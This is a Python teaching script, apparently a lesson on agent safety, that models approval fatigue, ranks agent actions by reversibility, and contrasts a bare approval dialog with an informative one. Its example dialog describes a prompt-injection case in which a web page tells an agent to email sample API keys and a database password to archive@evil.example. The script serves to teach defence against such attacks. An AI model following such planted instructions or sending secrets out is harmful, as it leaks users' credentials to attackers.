#!/usr/bin/env python3
"""
A24 -- Human Oversight That Works.

A confirmation dialog nobody reads is not a control. This file models approval
fatigue, grades actions by reversibility, and shows what an approval prompt has
to contain to be worth interrupting someone for.

    python3 a24_oversight.py
"""
import os
import sys
from dataclasses import dataclass

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from agentlib import ok, rule

# ---------------------------------------------------------------------------
# 1. approval fatigue, as arithmetic
# ---------------------------------------------------------------------------

rule("what happens to a human after N identical dialogs")

def attention(n, decay=0.82, floor=0.03):
    """Probability the reviewer actually reads dialog n. Illustrative, not measured."""
    return max(floor, decay ** (n - 1))

def catch_probability(prompts_per_day, malicious_at):
    """Chance the one malicious prompt of the day is the one they read carefully."""
    return attention(malicious_at)

print(f"  {'prompts/day':<14}{'attention at #1':<18}{'at the median':<18}{'at the last'}")
for n in (3, 12, 40, 150):
    print(f"  {n:<14}{attention(1):<18.0%}{attention(n // 2):<18.0%}{attention(n):.0%}")

print("""
  The curve is illustrative, but the shape is well established in the security
  usability literature (Egelman on SSL warnings; Akhawe and Felt on warning
  adherence in the field). Attention is a budget, it depletes, and it does not
  refill because you added a red border.

  Consequence: every low-value prompt you add makes the high-value prompt
  weaker. An approval gate is a SHARED resource that all of your prompts are
  spending from.""")
assert attention(40) < 0.05

# ---------------------------------------------------------------------------
# 2. grade by reversibility, not by "sensitivity"
# ---------------------------------------------------------------------------

rule("the axis that decides who gets interrupted")

@dataclass
class Action:
    name: str
    reversible: str      # free | costly | irreversible
    blast: str
    def gate(self):
        return {"free": "log only",
                "costly": "log + notify, undo available",
                "irreversible": "BLOCKING CONFIRMATION"}[self.reversible]

ACTIONS = [
 Action("read_file",        "free",         "one file"),
 Action("web_search",       "free",         "nothing"),
 Action("write_file",       "costly",       "one file, restorable from snapshot"),
 Action("git_commit",       "costly",       "revertable"),
 Action("git_push --force", "irreversible", "the branch history"),
 Action("send_email",       "irreversible", "unbounded — you cannot unsend"),
 Action("delete_repo",      "irreversible", "everything"),
 Action("payment",          "irreversible", "money"),
 Action("post_publicly",    "irreversible", "reputation"),
]
for a in ACTIONS:
    print(f"  {a.name:<20}{a.reversible:<14}{a.gate():<28}{a.blast}")

blocking = [a for a in ACTIONS if a.reversible == "irreversible"]
print(f"""
  {len(blocking)} of {len(ACTIONS)} actions get a blocking prompt. The other
  {len(ACTIONS) - len(blocking)} are logged or notified with an undo path.

  Note that "sensitivity" would have produced a different and worse list:
  read_file on a secret feels sensitive and is perfectly reversible, while
  send_email feels routine and cannot be undone. Reversibility is the axis
  that predicts regret.""")
assert len(blocking) == 5

# ---------------------------------------------------------------------------
# 3. what the prompt has to say
# ---------------------------------------------------------------------------

rule("two prompts for the same action")

BAD_PROMPT = "The agent wants to use the tool `send_email`. Allow?  [Allow] [Deny]"

GOOD_PROMPT = """\
  Send an email                                        IRREVERSIBLE

    to        archive@evil.example        <- not in your contacts, new domain
    subject   fwd
    body      STRIPE_KEY=sk_live_51H8xQ2
              DB_PASSWORD=hunter2

    Why the agent wants this
      An instruction found in the page you asked it to summarise
      (https://caching.example/guide) asked it to email this file.
      That instruction did not come from you.

    [ Send ]   [ Don't send ]   [ Don't send, and stop the task ]"""

print("  the prompt most systems show:\n")
print("    " + BAD_PROMPT)
print("\n  the prompt that would have been read:\n")
print(GOOD_PROMPT)
print("""
  The difference is not politeness. The second prompt shows:
    - the DATA leaving, not the tool name
    - the RECIPIENT, with a note on why it is unusual
    - the PROVENANCE of the instruction (A21 gives you this for free)
    - a third option, because "deny" alone leaves a hijacked agent running

  A user cannot evaluate `send_email`. They can absolutely evaluate
  "your Stripe key is about to go to a domain you have never contacted".""")

# ---------------------------------------------------------------------------
# 4. budget your interruptions
# ---------------------------------------------------------------------------

rule("a rule of thumb")
print("""  Set an interruption BUDGET -- say, three prompts per task -- and spend it
  on the irreversible actions only. If a task would exceed the budget:

     narrow the task              split it into approved phases
     pre-authorise a scope        "you may email anyone in my contacts"
     make the action reversible   drafts instead of sends; snapshots before
                                  writes; staged commits instead of pushes

  That last row is the one people skip. Turning an irreversible action into a
  reversible one removes the need for the prompt entirely, which is strictly
  better than making the prompt nicer.""")

ok("A24 complete -- attention is a budget; spend it where regret lives")
